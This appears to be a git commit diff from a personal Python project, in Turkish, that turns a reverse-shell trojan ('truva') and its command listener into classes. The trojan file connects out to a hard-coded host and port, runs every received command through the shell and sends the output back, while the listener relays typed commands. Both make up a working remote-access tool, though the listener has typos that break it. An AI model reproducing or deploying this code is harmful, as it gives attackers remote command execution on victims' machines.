5749471b730b2c1f672d3544dfb32a174e64ee04
serkancan <serkancan@DESKTOP-9CS0Q1K>
2024-01-29 09:06:13 +0300

    truva class

--- trojan/dinleyici.py
+++ trojan/dinleyici.py
@@ -1,25 +1,27 @@
 import socket
 
-baglanti = socket.socket(socket.AF_INET,socket.SOCK)
-baglanti.setsockopt(socket.SOL_SOCKET,socke.SO_REUSEADDR,1) 
+class Lister:
 
-baglanti.bind(("10.0.2.17",888))
-baglanti.listen(0)
-print("Dinlemeye Basladi!")
+    def __init__(self,ip,port):
+        baglanti = socket.socket(socket.AF_INET,socket.SOCK)
+        baglanti.setsockopt(socket.SOL_SOCKET,socke.SO_REUSEADDR,1) 
+        baglanti.bind((ip,port))
+        baglanti.listen(0)
+        print("Dinlemeye Basladi!")
 
-
-(baglan,adres) = baglanti.accept()
-
-print("baglanti kabul edildi. "+str(adres))
-
-while True:
-    giris = input("Komut Gir: ")
-    baglan.sendall(giris.encode("utf-8"))
-    gelen_veri = baglan.recv(1024).decode("utf-8")
-    print(gelen_veri)
+        self.baglan,adres = baglanti.accept()
+        print("baglanti kabul edildi. "+str(adres))
 
 
+    def baslatma(self):
+        while True:
+            giris = input("Komut Gir: ")
+            self.baglan.sendall(giris.encode("utf-8"))
+            gelen_veri = self.baglan.recv(1024).decode("utf-8")
+            print(gelen_veri)
 
 
+baglanti_kurma=Lister("10.0.2.17",888)
+baglanti_kurma.baslatma()
 
 
--- trojan/truva.py
+++ trojan/truva.py
@@ -1,25 +1,27 @@
 import socket
 import subprocess
 
+class Truva:
+
+    def __init__(self,ip,port):
+        self.baglanti = socket.socket(socket.AF_INET,socket.SOCK_STREAM)  #AF_INET6 SOCK_STREAM(tcp) SOCK_DGREAM(udp)
+
+        self.baglanti.connect((ip,port))      #ip adresimiz ve port numarası
 
 
-def komut_isleme(komut):
-    return subprocess.check_output(komut, shell=True)
-   
-
-baglanti = socket.socket(socket.AF_INET,socket.SOCK_STREAM)       #AF_INET6   SOCK_STREAM(tcp)  SOCK_DGREAM(udp)
-
-baglanti.connect(("10.0.2.17",888))      #ip adresimiz ve port numarası
-
-#baglanti.send("tamamdir icerideyiz\n".encode("utf-8"))
-
-while True:
-    komut = baglanti.recv(1024).decode("utf-8")
-    veri = komut_isleme(komut)
-    baglanti.send(veri)
+    def komut_isleme(self,komut):
+        return subprocess.check_output(komut, shell=True)
 
 
-baglanti.close()
+    def baslatma(self):
+        while True:
+            komut = self.baglanti.recv(1024).decode("utf-8")
+            veri = self.komut_isleme(komut)
+            self.baglanti.send(veri)
+
+        self.baglanti.close()
 
 
+baglanti_kurma = Truva("10.0.2.17",888)
+baglanti_kurma.baslatma()
 
